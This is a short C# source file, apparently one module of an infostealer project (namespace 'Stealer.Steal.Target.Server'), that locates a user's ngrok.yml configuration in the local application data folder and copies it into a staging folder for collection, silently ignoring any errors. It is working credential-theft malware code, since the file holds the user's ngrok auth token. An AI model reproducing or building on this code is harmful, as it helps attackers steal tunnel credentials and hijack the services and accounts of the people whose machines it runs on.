using System;
using System.IO;
using Stealer.Steal.Helper;

namespace Stealer.Steal.Target.Server;

internal class Ngrok
{
	public static void Start()
	{
		try
		{
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ngrok", "ngrok.yml");
			if (File.Exists(path))
			{
				DynamicFiles.WriteAllBytes(Path.Combine("Server", "Ngrok", "ngrok.yml"), File.ReadAllBytes(path));
			}
		}
		catch
		{
		}
	}
}
